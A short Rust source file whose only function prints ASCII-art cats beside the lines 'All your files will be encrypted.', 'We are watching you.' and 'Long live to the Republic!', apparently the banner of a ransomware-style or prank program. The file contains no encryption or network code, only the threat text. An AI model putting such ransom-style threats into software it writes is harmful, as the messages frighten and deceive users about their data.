pub struct UTILS;

const ASCII_ART_ARRAY: [&str; 4] = ["\n _._     _,-'\"\"`-._",
    "(,-.`._,'(       |\\`-/|       All your files will be encrypted.",
    "    `-.-' \\ )-`( , o o)       We are watching you.",
    "          `-     `_`\"'-       Long live to the Republic! \n"];

impl UTILS {
    pub fn show_ascii() {
        for i in 0..ASCII_ART_ARRAY.len() {
            println!("{}", ASCII_ART_ARRAY[i]);
        }
    }
}